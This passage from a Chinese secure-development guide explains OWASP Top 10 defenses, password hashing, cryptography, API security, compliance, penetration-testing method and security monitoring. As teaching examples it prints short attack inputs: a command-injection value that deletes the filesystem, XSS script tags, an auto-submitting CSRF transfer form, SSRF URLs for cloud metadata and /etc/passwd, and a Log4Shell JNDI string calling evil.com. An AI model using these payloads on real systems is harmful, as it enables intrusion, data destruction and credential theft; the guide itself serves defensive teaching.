\`\`\`

**多语言对照（参数化查询）**：

Java (JDBC PreparedStatement):
\`\`\`java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
ps.setString(1, username);
ResultSet rs = ps.executeQuery();
\`\`\`

Python (参数化):
\`\`\`python
cursor.execute("SELECT * FROM users WHERE name = %s", (username,))
\`\`\`

Go (database/sql):
\`\`\`go
db.Query("SELECT * FROM users WHERE name = $1", username)
\`\`\`

Node.js (参数化):
\`\`\`javascript
db.query("SELECT * FROM users WHERE name = ?", [username])
\`\`\`

**命令注入**：

\`\`\`
系统调用 ping：
  exec("ping " + userInput)

攻击者输入："; rm -rf /" → 执行 rm -rf /！
防御：用参数数组而非字符串拼接
  exec("ping", [userInput])  → userInput 只作为参数
\`\`\`

**ORM 的安全价值**：ORM（如 MyBatis/Hibernate/Sequelize）默认参数化，能有效防止 SQL 注入。但"拼接 SQL"的写法仍可能绕过 ORM 的保护。

#### 1.2 失效的身份认证

**风险**：

- 弱密码（123456、password）。
- 会话固定（Session Fixation）：攻击者让用户用攻击者的 Session ID。
- 会话劫持（Session Hijacking）：攻击者窃取用户 Session ID。

**防御**：

\`\`\`
1. 强密码策略：至少 8 位，含大小写+数字+符号
2. MFA（多因素认证）：密码 + 短信/邮箱验证码/动态令牌
3. 会话过期：闲置 30 分钟自动登出
4. Session ID 定期轮换：登录后换新 ID（防会话固定）
5. HTTPS：防止 Session ID 被窃听
6. 登录失败限制：5 次失败锁定 15 分钟（防暴力破解）
\`\`\`

#### 1.3 敏感数据泄露

**风险**：

- 明文存储密码（数据库泄露 → 密码暴露）。
- 明文传输（HTTP → 中间人窃听）。
- 敏感信息（身份证、银行卡）明文存储。

**防御**：

\`\`\`
1. 密码哈希存储：bcrypt/scrypt/argon2（加盐，慢哈希）
2. 敏感字段加密：身份证/银行卡用 AES 加密存储
3. 传输加密：全站 HTTPS（TLS 1.2+）
4. 数据脱敏：日志/返回中只显示后 4 位（如 138****8888）
5. 密钥管理：用 KMS（密钥管理服务），不硬编码密钥
\`\`\`

#### 1.4 XSS 跨站脚本（Cross-Site Scripting）

**原理**：攻击者把恶意脚本注入页面，在其他用户浏览器执行。

**三种 XSS**：

**反射型 XSS**：

\`\`\`
URL: https://site.com/search?q=<script>stealCookie()</script>
  → 服务端把 q 直接输出到页面 → 浏览器执行 script → Cookie 被偷

  攻击者发钓鱼链接 → 用户点击 → Cookie 被盗
\`\`\`

**存储型 XSS**：

\`\`\`
攻击者在评论区提交：<script>stealCookie()</script>
  → 存入数据库 → 所有查看评论的用户浏览器执行 → 大规模攻击
  → 比反射型危害更大（持久化）
\`\`\`

**DOM 型 XSS**：

\`\`\`
页面 JS 直接把 URL 参数写入 DOM：
  document.getElementById('content').innerHTML = location.hash
  → hash = "<script>..." → 脚本执行
  → 纯前端，不经过服务端
\`\`\`

**防御**：

\`\`\`
1. 输出编码：把 < > & " ' 转义成 HTML 实体
   < → &lt;  > → &gt;  " → &quot;
   → 脚本变成文本，不会执行

2. CSP（Content Security Policy）：限制脚本来源
   Header: Content-Security-Policy: script-src 'self'
   → 只允许本站脚本，外部脚本被拦截

3. HttpOnly Cookie：JS 无法读取 Cookie
   Set-Cookie: sessionId=xxx; HttpOnly
   → 即使 XSS 执行，也偷不到 Cookie

4. 输入校验：限制输入长度、格式（但不能只靠输入校验）
\`\`\`

**多语言对照（输出编码）**：

Java:
\`\`\`java
import org.apache.commons.text.StringEscapeUtils;
String safe = StringEscapeUtils.escapeHtml4(userInput);
\`\`\`

Python:
\`\`\`python
import html
safe = html.escape(user_input)
\`\`\`

Node.js:
\`\`\`javascript
const safe = userInput.replace(/[<>&"']/g, c => ({
    '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;'
}[c]));
\`\`\`

#### 1.5 CSRF 跨站请求伪造

**原理**：攻击者诱导用户在已登录状态下，发起非自愿的请求。

\`\`\`
用户登录银行网站（Cookie 有效）
  攻击者网站有个表单：
    <form action="https://bank.com/transfer" method="POST">
      <input name="to" value="hacker">
      <input name="amount" value="10000">
    </form>
    <script>document.forms[0].submit()</script>
  → 用户访问攻击者网站 → 表单自动提交 → 银行收到请求
  → 浏览器自动带 Cookie → 银行以为是用户操作 → 转账成功！
\`\`\`

**防御**：

\`\`\`
1. CSRF Token：
   服务端生成随机 Token → 嵌入表单隐藏字段
   提交时校验 Token → 攻击者不知道 Token → 请求被拒

2. SameSite Cookie：
   Set-Cookie: sessionId=xxx; SameSite=Strict
   → 跨站请求不带 Cookie → CSRF 失效

3. Origin/Referer 校验：
   检查请求来源 → 只允许本站 → 跨站请求拒绝

4. 敏感操作二次确认：
   转账需输入验证码/密码 → 即使 CSRF 也无法通过
\`\`\`

#### 1.6 SSRF 服务端请求伪造

**原理**：攻击者让服务端发起请求，访问内部资源。

\`\`\`
"图片代理"接口：
  GET /proxy?url=https://evil.com/image.jpg

攻击者输入：url=http://169.254.169.254/latest/meta-data/
  → 服务端请求云元数据接口 → 拿到 AccessKey！

或 url=http://localhost:6379 → 探测内网 Redis
或 url=file:///etc/passwd → 读取系统文件
\`\`\`

**防御**：

\`\`\`
1. URL 白名单：只允许特定域名
2. 禁止内网 IP：检查目标 IP，拒绝 10.x/172.16.x/192.168.x/127.x/169.254.x
3. 禁止特殊协议：只允许 http/https，拒绝 file/gopher/ftp
4. 限制重定向：禁止跟随重定向（重定向可能到内网）
5. DNS 重绑定防护：解析 IP 后校验，而非信任域名
\`\`\`

#### 1.7 越权访问

**水平越权**：同权限级别用户互相访问数据。

\`\`\`
用户 A 请求 GET /orders/1001（自己的订单）
  → 改成 GET /orders/1002（用户 B 的订单）
  → 如果服务端只校验"登录"不校验"归属" → A 看到 B 的订单！

  防御：每次查询都校验"这个订单是否属于当前用户"
\`\`\`

**垂直越权**：低权限用户访问高权限功能。

\`\`\`
普通用户请求 GET /admin/users
  → 如果服务端只校验"登录"不校验"角色" → 普通用户看到管理后台！

  防御：每个接口校验角色权限
\`\`\`

**防御**：

\`\`\`
1. 数据归属校验：查询/修改数据时校验"是否属于当前用户"
2. RBAC 权限模型：基于角色的访问控制，每个接口绑定角色
3. 最小权限原则：默认拒绝，明确允许
4. 接口权限统一管理：用中间件/注解统一校验，避免遗漏
\`\`\`

#### 1.8 安全配置错误

**常见问题**：

- 默认密码（admin/admin）。
- 目录列出（List Directory）开启。
- 详细错误信息暴露（堆栈跟踪）。
- 不必要的功能开启（如 debug 模式）。
- 缺少安全头（X-Frame-Options, X-Content-Type-Options）。

**防御**：

\`\`\`
1. 安全配置基线：制定配置规范，所有环境统一
2. 关闭默认账号/改默认密码
3. 生产环境关闭 debug/详细错误
4. 设置安全头：
   X-Frame-Options: DENY（防点击劫持）
   X-Content-Type-Options: nosniff（防 MIME 嗅探）
   Strict-Transport-Security: max-age=31536000（强制 HTTPS）
5. 定期安全扫描：用工具扫描配置漏洞
\`\`\`

#### 1.9 不安全的反序列化

**原理**：反序列化用户输入的恶意对象，触发任意代码执行。

\`\`\`
Java 反序列化漏洞（如 Fastjson/Log4Shell）：
  攻击者构造恶意 JSON/序列化数据
  → 服务端反序列化 → 触发构造函数/Setter → 执行恶意代码

  典型：Fastjson autotype 漏洞、Apache Commons Collections 漏洞
\`\`\`

**防御**：

\`\`\`
1. 不反序列化不可信数据
2. 用白名单限制可反序列化的类
3. 升级有漏洞的库（Fastjson→Fastjson2/Safe 版本）
4. 用 JSON 而非二进制序列化（JSON 不触发代码执行）
\`\`\`

#### 1.10 已知漏洞组件

**风险**：使用了含已知漏洞的第三方库。

\`\`\`
Log4j 2.x 的 Log4Shell 漏洞（CVE-2021-44228）：
  攻击者输入 \${jndi:ldap://evil.com/x}
  → Log4j 解析 → 发起 LDAP 请求 → 加载恶意类 → RCE！
  → 全球数百万系统受影响

类似：Spring CVE、Struts2 漏洞、各种库的漏洞
\`\`\`

**防御**：

\`\`\`
1. 依赖扫描（SCA）：用工具扫描依赖中的已知漏洞
   - OWASP Dependency-Check
   - Snyk
   - GitHub Dependabot
2. 及时升级：发现漏洞库立即升级
3. 依赖最小化：不用的库及时移除
4. 锁定版本：package-lock.json / pom.xml 锁定，避免供应链攻击
\`\`\`

---

### 二、密码存储安全

#### 2.1 为什么不能用 MD5/SHA

\`\`\`
MD5 哈希：
  md5("password") = 5f4dcc3b5aa765d61d8327deb882cf99

问题1：彩虹表攻击
  预计算所有常见密码的 MD5 → 查表秒破
  "5f4dcc3b5aa765d61d8327deb882cf99" → 查表 → "password"

问题2：相同密码哈希相同
  两个用户都用 "password" → 哈希一样 → 看一眼就知道密码相同

问题3：MD5 太快
  现代 GPU 每秒算几十亿次 MD5 → 暴力破解很快

→ MD5/SHA 是"快速哈希"，适合校验完整性，不适合存密码
\`\`\`

#### 2.2 bcrypt / scrypt / argon2

密码哈希需要"慢"——让暴力破解代价极高。

**bcrypt**：

\`\`\`
bcrypt(password, salt, costFactor):
  costFactor = 10 → 哈希 2^10=1024 轮 → 慢
  costFactor = 12 → 哈希 4096 轮 → 更慢
  → 暴力破解每秒只能试几十次

  salt 内置在哈希结果中 → 相同密码哈希不同
  costFactor 可调 → 硬件升级后可增加轮数
\`\`\`

**scrypt**：

\`\`\`
scrypt 不仅慢，还耗内存（如 4MB）
  → GPU 并行破解受限于内存 → 更难破解
\`\`\`

**argon2**：

\`\`\`
Argon2（2015 密码哈希竞赛冠军）：
  - 可调 CPU 和内存消耗
  - 抗 GPU/ASIC 攻击
  → 目前推荐的密码哈希算法
\`\`\`

**多语言对照（密码哈希）**：

Java (BCrypt):
\`\`\`java
String hashed = BCrypt.hashpw(password, BCrypt.gensalt(12));
boolean valid = BCrypt.checkpw(password, hashed);
\`\`\`

Python (bcrypt):
\`\`\`python
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(12))
valid = bcrypt.checkpw(password.encode(), hashed)
\`\`\`

Go (bcrypt):
\`\`\`go
hashed, _ := bcrypt.GenerateFromPassword([]byte(password), 12)
err := bcrypt.CompareHashAndPassword(hashed, []byte(password))
\`\`\`

Node.js (crypto.scryptSync):
\`\`\`javascript
const salt = crypto.randomBytes(16);
const hash = crypto.scryptSync(password, salt, 64, { N: 16384 });
const stored = salt.toString('hex') + ':' + hash.toString('hex');
\`\`\`

#### 2.3 加盐防彩虹表

\`\`\`
无盐：
  md5("password") = 5f4dcc...（固定，可查彩虹表）

有盐：
  md5("password" + "randomsalt123") = abc123...
  md5("password" + "randomsalt456") = def456...
  → 每个用户不同盐 → 彩虹表失效（要为每个盐重新算）

  salt 随机生成（16+ 字节），存数据库（不需要加密）
\`\`\`

---

### 三、加密技术

#### 3.1 对称加密（AES）

\`\`\`
对称加密：加密和解密用同一个密钥
  加密：AES加密(明文, 密钥) → 密文
  解密：AES解密(密文, 密钥) → 明文

特点：
  - 速度快，适合大量数据
  - 密钥分发是难点（怎么安全传密钥？）

  AES-256：密钥 256 位，目前无有效破解方法
\`\`\`

#### 3.2 非对称加密（RSA）

\`\`\`
非对称加密：公钥加密，私钥解密（或反之）
  公钥（公开）：加密用
  私钥（保密）：解密用

  用途1：加密通信
    A 用 B 的公钥加密 → 只有 B 的私钥能解
  用途2：数字签名
    A 用自己私钥签名 → 所有人用 A 公钥验签

  RSA-2048+：目前安全，但慢，只加密少量数据（如对称密钥）
\`\`\`

#### 3.3 哈希（SHA-256）

\`\`\`
哈希：单向，不可逆
  SHA-256("hello") = 2cf24dba...
  → 无法从哈希反推原文

  用途：
  - 校验完整性（文件/消息摘要）
  - 存密码（用慢哈希 bcrypt）
  - 数字签名（对哈希签名而非原文）
\`\`\`

#### 3.4 密钥管理（KMS）

\`\`\`
密钥不能硬编码在代码里（代码泄露 → 密钥泄露）
  → 用 KMS（Key Management Service）

  AWS KMS / 阿里云 KMS / HashiCorp Vault：
  - 密钥存在 KMS，应用通过 API 调用
  - 密钥有生命周期（创建/轮换/销毁）
  - 访问有审计日志
\`\`\`

---

### 四、API 安全

#### 4.1 鉴权

\`\`\`
API 必须鉴权：确认"你是谁"
  方式1：API Key（简单场景）
  方式2：JWT（无状态，微服务常用）
  方式3：OAuth 2.0（第三方授权）
  方式4：Session + Cookie（传统 Web）
\`\`\`

#### 4.2 限流

\`\`\`
API 必须限流：防止暴力调用/CC 攻击
  - 按 IP 限流：每 IP 每分钟 100 次
  - 按用户限流：每用户每分钟 60 次
  - 按接口限流：敏感接口更严（如登录每分钟 5 次）
\`\`\`

#### 4.3 签名防篡改

\`\`\`
API 请求签名：
  1. 客户端按规则拼接参数 + 时间戳 + 密钥
  2. 算 HMAC-SHA256 签名
  3. 请求带签名
  4. 服务端同样计算并比对 → 不一致则拒绝

  → 攻击者篡改参数 → 签名不匹配 → 拒绝
\`\`\`

#### 4.4 时间戳防重放

\`\`\`
防重放攻击：
  请求带时间戳 + 签名
  服务端校验：
  - 签名正确？
  - 时间戳在合理范围（如 ±5 分钟内）？
  - 该请求是否已处理过（用 nonce 去重）？

  → 攻击者截获请求重放 → 时间戳过期 或 nonce 重复 → 拒绝
\`\`\`

#### 4.5 HTTPS

\`\`\`
全站 HTTPS：传输加密，防窃听/篡改
  - 用 TLS 1.2+（禁用 SSLv3/TLS1.0/1.1）
  - HSTS：强制浏览器用 HTTPS
  - 证书自动续期（Let's Encrypt / ACME）
\`\`\`

---

### 五、安全开发生命周期（SDL）

#### 5.1 SDL 流程

\`\`\`
1. 需求阶段：安全需求评审（这个功能有什么安全风险？）
2. 设计阶段：威胁建模（STRIDE 模型，识别威胁）
3. 编码阶段：安全编码规范（OWASP Cheat Sheet）
4. 测试阶段：
   - SAST（静态扫描）：扫描代码漏洞
   - DAST（动态扫描）：扫描运行时漏洞
   - 渗透测试：人工模拟攻击
5. 上线阶段：
   - 依赖扫描（SCA）
   - 配置安全检查
   - 安全基线核查
6. 运维阶段：
   - 漏洞监控（CVE 订阅）
   - 安全日志审计
   - 应急响应
\`\`\`

#### 5.2 STRIDE 威胁建模

\`\`\`
S - Spoofing（仿冒）：冒充他人身份
T - Tampering（篡改）：修改数据
R - Repudiation（抵赖）：否认操作
I - Information Disclosure（信息泄露）
D - Denial of Service（拒绝服务）
E - Elevation of Privilege（提权）

  对每个功能问这 6 个问题 → 识别威胁 → 设计防御
\`\`\`

---

### 六、常见安全漏洞修复 Checklist

\`\`\`
[ ] SQL 注入：全部用参数化查询/ORM
[ ] XSS：输出编码 + CSP + HttpOnly Cookie
[ ] CSRF：CSRF Token + SameSite Cookie
[ ] 越权：每个接口校验权限 + 数据归属
[ ] 密码存储：bcrypt/scrypt/argon2 加盐
[ ] 敏感数据：加密存储 + 传输 HTTPS
[ ] 错误处理：生产环境不暴露详细错误
[ ] 依赖管理：定期扫描漏洞库
[ ] 安全头：HSTS/X-Frame-Options/X-Content-Type-Options
[ ] 日志审计：记录关键操作，不记敏感信息
[ ] 限流：防止暴力/CC 攻击
[ ] 接口鉴权：所有接口必须鉴权
\`\`\`

---

### 七、安全监控与应急响应

#### 7.1 安全监控

\`\`\`
监控内容：
  - 异常登录（异地登录、频繁失败）
  - 异常请求（大量请求、注入特征）
  - 权限变更（提权、角色修改）
  - 数据导出（大批量查询）
  - 系统异常（CPU 飙升可能被挖矿）

工具：
  - SIEM（安全信息事件管理）：日志聚合分析
  - WAF（Web 应用防火墙）：拦截恶意请求
  - IDS/IPS（入侵检测/防御）
\`\`\`

#### 7.2 应急响应

\`\`\`
安全事故响应流程：
  1. 发现：监控告警 / 用户报告 / 外部通报
  2. 确认：确认是否真实安全事故
  3. 遏制：隔离受影响系统（如下线/封 IP）
  4. 根除：清除攻击痕迹（删后门/改密码/修漏洞）
  5. 恢复：恢复服务，加强监控
  6. 总结：事故复盘，改进措施

黄金原则：
  - 保留现场（日志/镜像），便于取证
  - 及时通报（合规要求）
  - 优先保用户数据
\`\`\`

---

### 八、生产案例

#### 案例1：LinkedIn 密码泄露

\`\`\`
2012 年 LinkedIn 6.5 亿密码泄露（SHA1 无盐哈希）
  → 攻击者用彩虹表破解大量密码
  → 用户在其他网站用相同密码 → 连锁泄露
教训：密码必须用 bcrypt 加盐慢哈希
\`\`\`

#### 案例2：Equifax 数据泄露

\`\`\`
2017 年 Equifax 1.43 亿用户数据泄露
  → 原因：Apache Struts2 已知漏洞未及时修复（CVE-2017-5638）
  → 3 月漏洞公开，5 月才打补丁，期间被攻击
教训：依赖漏洞必须及时修复，建立漏洞响应机制
\`\`\`

#### 案例3：Log4Shell 漏洞

\`\`\`
2021 年 Log4j2 漏洞（CVE-2021-44228）
  → 攻击者通过日志输入触发 JNDI 注入 → 远程代码执行
  → 全球数百万系统受影响，应急持续数月
教训：第三方库漏洞影响巨大，需建立依赖监控+快速响应
\`\`\`

---

### 九、本章小结

安全防护核心知识回顾：

1. **OWASP Top 10**：注入/认证失效/数据泄露/XSS/CSRF/SSRF/越权/配置错误/反序列化/漏洞组件。
2. **SQL 注入**：参数化查询是根本防御，ORM 默认安全。
3. **XSS**：输出编码 + CSP + HttpOnly，三重防御。
4. **CSRF**：Token + SameSite + Origin 校验。
5. **SSRF**：URL 白名单 + 禁内网 IP。
6. **越权**：数据归属校验 + RBAC + 最小权限。
7. **密码存储**：bcrypt/scrypt/argon2 加盐慢哈希，不用 MD5/SHA。
8. **加密**：对称 AES（数据）/非对称 RSA（密钥交换/签名）/哈希 SHA-256（完整性）。
9. **API 安全**：鉴权 + 限流 + 签名 + 时间戳 + HTTPS。
10. **SDL**：需求评审→威胁建模→安全编码→SAST/DAST→上线扫描→运维监控。
11. **应急响应**：发现→确认→遏制→根除→恢复→总结。
12. **持续安全**：依赖扫描、漏洞监控、定期渗透测试。

## 十三、密码学基础深入

### 13.1 对称加密

对称加密使用同一密钥加密和解密。

**AES**（Advanced Encryption Standard）：
- 密钥长度：128/192/256 位
- 分组模式：ECB（不安全）、CBC、CTR、GCM（推荐）
- GCM 模式同时提供加密和完整性（AEAD）
- 性能：硬件加速（AES-NI 指令集）可达 GB/s

**ChaCha20**：
- 流密码，搭配 Poly1305 做认证
- 无硬件加速时比 AES-GCM 更快
- 用于 TLS 1.3、WireGuard

多语言对比：
- Java：Cipher.getInstance("AES/GCM/NoPadding")
- Go：crypto/aes + crypto/cipher
- Python：cryptography 库
- Node.js：crypto.createCipheriv()

### 13.2 非对称加密

**RSA**：
- 基于大数分解难题
- 密钥长度：2048/4096 位
- 用于加密小数据和数字签名
- 加密慢，通常用于交换对称密钥

**ECC（椭圆曲线）**：
- 基于椭圆曲线离散对数难题
- 256 位 ECC 安全性 ≈ 3072 位 RSA
- 密钥更短，性能更好
- 曲线选择：P-256、Curve25519（推荐）

**密钥交换**：
- DH（Diffie-Hellman）：最早的密钥交换协议
- ECDH：椭圆曲线版，更快更安全
- TLS 1.3 使用 ECDHE 做前向保密

### 13.3 哈希函数

| 算法 | 输出长度 | 安全性 | 用途 |
|------|---------|--------|------|
| MD5 | 128bit | 已不安全 | 仅校验 |
| SHA-1 | 160bit | 已不安全 | 已淘汰 |
| SHA-256 | 256bit | 安全 | 通用 |
| SHA-3 | 256bit | 安全 | 新标准 |
| BLAKE2/3 | 可变 | 安全，快 | 高性能场景 |

哈希特性：
1. 确定性：相同输入相同输出
2. 雪崩效应：输入微小变化导致输出巨变
3. 不可逆：无法从输出推导输入
4. 抗碰撞：很难找到两个不同输入产生相同输出

### 13.4 消息认证码（MAC）

HMAC（Hash-based MAC）：
- 使用密钥的哈希
- HMAC-SHA256 最常用
- 验证消息完整性和真实性

### 13.5 数字签名

签名流程：
1. 发送方对消息做哈希
2. 用私钥加密哈希值（签名）
3. 接收方用公钥解密签名得到哈希
4. 对比本地计算的哈希

签名算法：
- RSA-PSS（推荐）
- ECDSA（椭圆曲线签名）
- Ed25519（现代推荐，快且安全）

### 13.6 密码存储

**bcrypt**：
- 自带盐，可调 cost 参数
- cost=12 表示 2^12 次迭代
- 限制密码长度 72 字节

**scrypt**：
- 内存硬函数，抗 GPU/ASIC 破解
- 参数：N（CPU/内存）、r（块大小）、p（并行度）
- 常用：N=16384, r=8, p=1

**argon2**：
- 密码哈希竞赛冠军
- argon2id 混合抗时序和内存攻击
- 现代推荐首选

## 十四、API 安全深度防御

### 14.1 认证（Authentication）

**Bearer Token（JWT）**：
- 无状态，服务端不存储
- 过期时间短（1h），Refresh Token 长期（7d）
- 缺点：无法主动失效（需黑名单）

**OAuth 2.0**：
- 授权码模式（最安全，服务端应用）
- 简化模式（前端 SPA）
- 客户端凭证（服务间调用）
- 密码模式（不推荐，仅遗留系统）

**OIDC（OpenID Connect）**：
- 基于 OAuth 2.0 的身份层
- 提供 ID Token（JWT 格式）
- 单点登录（SSO）标准

### 14.2 授权（Authorization）

**RBAC（基于角色）**：
- 用户→角色→权限
- 简单，适合大多数场景
- 缺点：角色爆炸（细粒度需求）

**ABAC（基于属性）**：
- 基于用户/资源/环境属性
- 更灵活，细粒度
- 实现复杂

**ACL（访问控制列表）**：
- 每个资源关联允许访问的用户列表
- 适合资源数量少的场景

### 14.3 限流（Rate Limiting）

算法：
1. **固定窗口**：每分钟最多 N 次，简单但有突发
2. **滑动窗口**：更平滑，实现稍复杂
3. **令牌桶**：允许突发，匀速补充令牌
4. **漏桶**：匀速消费，不允许突发

实现：
- 单机：内存计数器
- 分布式：Redis + Lua 脚本

限流维度：
- IP：防爬虫/CC 攻击
- 用户：防滥用
- API：保护下游
- 全局：保护系统

### 14.4 API 签名

签名流程：
1. 请求参数按 Key 排序
2. 拼接成字符串
3. 加入时间戳和随机数
4. 用密钥做 HMAC-SHA256
5. 签名放在 Header

验证：
1. 验证时间戳（±5分钟内）
2. 验证随机数未用过（防重放）
3. 重新计算签名对比

### 14.5 HTTPS/TLS

TLS 握手流程（TLS 1.3）：
1. Client Hello（支持的密码套件）
2. Server Hello（选择的套件 + 证书 + 密钥交换）
3. Client 验证证书，发送密钥交换
4. 双方计算出共享密钥
5. 后续使用对称加密通信

TLS 1.3 相比 1.2：
- 握手从 2-RTT 减到 1-RTT
- 移除不安全算法（RSA 密钥交换、RC4、SHA-1）
- 前向保密（ECDHE）

## 十五、安全合规与标准

### 15.1 常见合规标准

| 标准 | 范围 | 说明 |
|------|------|------|
| PCI DSS | 支付卡 | 信用卡数据处理安全标准 |
| GDPR | 欧盟 | 通用数据保护条例 |
| ISO 27001 | 通用 | 信息安全管理体系 |
| SOC 2 | 通用 | 服务组织控制报告 |
| HIPAA | 医疗 | 健康信息隐私和保护 |
| 等保 2.0 | 中国 | 网络安全等级保护 |

### 15.2 GDPR 关键要求

1. 数据最小化：只收集必要数据
2. 明确同意：用户明确同意才能处理数据
3. 被遗忘权：用户可要求删除数据
4. 数据可携带：用户可导出数据
5. 72 小时报告：数据泄露 72 小时内报告

### 15.3 等保 2.0 核心要求

1. 安全物理环境：机房物理安全
2. 安全通信网络：网络架构、通信加密
3. 安全区域边界：边界防护、访问控制
4. 安全计算环境：身份鉴别、数据完整性
5. 安全管理中心：集中管理、审计

## 十六、渗透测试方法论

### 16.1 渗透测试流程

1. **信息收集**：域名、IP、端口、技术栈
2. **漏洞扫描**：自动化工具扫描（Nessus、AWVS）
3. **漏洞利用**：手动验证和利用
4. **后渗透**：权限提升、横向移动
5. **报告**：漏洞详情、修复建议

### 16.2 OWASP 测试指南

- 身份认证测试
- 授权测试
- 会话管理测试
- 输入验证测试
- 错误处理测试
- 加密测试
- 业务逻辑测试

### 16.3 常用工具

| 工具 | 用途 |
|------|------|
| Burp Suite | Web 渗透测试平台 |
| Nmap | 端口扫描 |
| Metasploit | 漏洞利用框架 |
| SQLMap | SQL 注入自动化 |
| Nikto | Web 服务器扫描 |
| ZAP | 开源 Web 扫描 |

### 16.4 漏洞奖励计划

- Google VRP：最高 $31,337
- HackerOne / Bugcrowd：漏洞协调平台
- 阿里云先知计划
- 腾讯 TSRC

## 十七、Web 安全漏洞防护详解

### 17.1 SQL 注入防护

注入原理：用户输入拼接进 SQL 语句，改变语义。

防护方案：
1. **参数化查询**（首选）：使用 PreparedStatement，输入作为参数而非拼接
2. **ORM**：使用 MyBatis/Hibernate/GORM 等 ORM 的参数化接口
3. **输入校验**：白名单校验，拒绝特殊字符
4. **最小权限**：DB 账号只授予必要权限
5. **WAF**：Web 应用防火墙，拦截恶意请求

多语言参数化查询对比：
- Java：PreparedStatement.executeQuery()
- Go：db.Query("SELECT * FROM users WHERE id = ?", id)
- Python：cursor.execute("SELECT * FROM users WHERE id = %s", (id,))
- Node.js：connection.query("SELECT * FROM users WHERE id = ?", [id])

### 17.2 XSS 防护

XSS 类型：
1. 反射型：恶意脚本在 URL 中，服务器反射到页面
2. 存储型：恶意脚本存入 DB，其他用户访问时触发
3. DOM 型：前端 JS 操作 DOM 引入恶意脚本

防护方案：
1. **输出编码**：HTML 实体编码（< → &lt;）
2. **CSP（Content Security Policy）**：限制脚本来源
3. **HttpOnly Cookie**：JS 无法读取 Cookie
4. **输入校验**：过滤危险字符
5. **框架自动转义**：React/Vue 默认转义

### 17.3 CSRF 防护

CSRF 原理：攻击者诱导用户访问恶意网站，利用 Cookie 发起跨站请求。

防护方案：
1. **CSRF Token**：服务端生成 Token，表单提交时验证
2. **SameSite Cookie**：SameSite=Strict/Lax，限制跨站携带
3. **Referer 校验**：检查请求来源
4. **二次确认**：敏感操作要求密码/验证码

### 17.4 SSRF 防护

SSRF 原理：攻击者让服务器发起请求到内网资源。

防护方案：
1. **URL 白名单**：只允许请求预定义域名
2. **禁止内网 IP**：过滤 10.0.0.0/8、172.16.0.0/12、192.168.0.0/16
3. **禁止特殊协议**：只允许 http/https，禁止 file://、gopher://
4. **DNS 重绑定防护**：解析后检查 IP，而非信任域名

### 17.5 文件上传安全

风险：上传可执行文件（PHP/JSP）、Webshell、大文件 DoS。

防护：
1. **文件类型校验**：检查 MIME + 扩展名 + 文件头
2. **文件重命名**：随机文件名，防止覆盖
3. **存储隔离**：上传文件不在 Web 路径下
4. **大小限制**：限制上传大小
5. **图片处理**：重新编码图片，去除 EXIF 和恶意代码

## 十八、身份认证与授权

### 18.1 会话管理

Cookie + Session：
- 服务端存储 Session，Cookie 携带 Session ID
- 缺点：有状态，难扩展

JWT（无状态）：
- Token 包含用户信息，服务端不存储
- Header.Payload.Signature
- 优点：无状态、跨域
- 缺点：无法主动失效、Token 较大

Refresh Token：
- Access Token 短期（1h）
- Refresh Token 长期（7d），用于刷新 Access Token
- Access Token 泄露风险窗口小

### 18.2 多因素认证（MFA）

认证因素：
1. 知道什么：密码、PIN
2. 拥有什么：手机、硬件 Key
3. 是什么：指纹、人脸

MFA 组合两个以上因素，大幅提升安全性。

实现方式：
- 短信验证码（安全性较低，SIM 劫持）
- TOTP（Google Authenticator，RFC 6238）
- U2F/FIDO2（硬件 Key，最安全）
- 推送通知（App 确认）

### 18.3 OAuth 2.0 深入

授权码模式流程：
1. 客户端重定向用户到授权服务器
2. 用户登录并授权
3. 授权服务器返回授权码（redirect_uri）
4. 客户端用授权码换取 Access Token
5. 客户端用 Token 访问资源

安全要点：
- redirect_uri 必须严格校验（防开放重定向）
- 使用 PKCE 防止授权码拦截
- state 参数防 CSRF

### 18.4 RBAC 与 ABAC

RBAC（基于角色）：
- 用户 → 角色 → 权限
- 简单直观
- 缺点：细粒度控制时角色爆炸

ABAC（基于属性）：
- 基于用户属性、资源属性、环境属性
- 策略：如果 (user.department == resource.department) AND (time in work_hours) 则允许
- 更灵活但更复杂

多语言权限框架：
- Java：Spring Security + 自定义
- Go：Casbin（支持 RBAC/ABAC）
- Python：Flask-Security / Django Guardian
- Node.js：accesscontrol / casbin

## 十九、密钥管理

### 19.1 密钥生命周期

1. 生成：使用安全随机数（CSPRNG）
2. 分发：安全传输到使用方
3. 使用：按需使用，不在日志中记录
4. 轮换：定期更换密钥
5. 撤销：密钥泄露后立即撤销
6. 销毁：安全删除，不可恢复

### 19.2 密钥管理服务（KMS）

AWS KMS / 阿里云 KMS / HashiCorp Vault：
- 密钥不在应用中明文存储
- 应用通过 API 调用 KMS 加解密
- 支持 AUDIT LOG，记录密钥使用
- 支持自动轮换

### 19.3 密钥分级

- L1 主密钥（Master Key）：KMS 管理，永不导出
- L2 数据加密密钥（DEK）：用 L1 加密，可分发给应用
- L3 数据：用 L2 加密存储

信封加密：用 DEK 加密数据，用 Master Key 加密 DEK，存储加密后的 DEK 和数据。

## 二十、安全监控与告警

### 20.1 安全监控维度

1. **访问日志**：所有 API 请求记录，含来源 IP、用户、操作
2. **认证日志**：登录/登出、Token 验证、失败原因
3. **授权日志**：权限校验、拒绝记录
4. **异常检测**：异常 IP、异常频率、异常行为
5. **漏洞扫描**：定期扫描组件漏洞
6. **WAF 日志**：拦截的攻击记录

### 20.2 SIEM 安全信息事件管理

SIEM（Security Information and Event Management）：
- 日志聚合：收集所有安全日志
- 关联分析：跨系统关联安全事件
- 异常检测：基于规则 + 机器学习
- 告警响应：自动告警 + 响应

开源工具：
- Elastic SIEM：ELK + Elastic Security
- Wazuh：开源 SIEM
- OSSEC：主机入侵检测
- Suricata：网络入侵检测

### 20.3 告警规则示例

| 规则 | 条件 | 级别 |
|------|------|------|
| 暴力破解 | 1分钟内 5 次登录失败 | P2 |
| 异常登录 | 异地登录 | P2 |
| SQL 注入 | WAF 拦截 SQL 模式 | P1 |
| XSS 攻击 | WAF 拦截脚本标签 | P1 |
| 批量请求 | 单 IP > 100 req/s | P2 |
| 越权访问 | 权限校验失败 > 10 次 | P1 |
| 数据泄露 | 大量数据导出 | P0 |

### 20.4 入侵检测（IDS/IPS）

IDS（Intrusion Detection System）：
- 被动监控，检测攻击
- 基于特征（签名）或异常（行为）

IPS（Intrusion Prevention System）：
- 主动阻断，实时防御
- 部署在网络关键路径

工具：
- Snort：开源 NIDS
- Suricata：高性能 NIDS/IPS
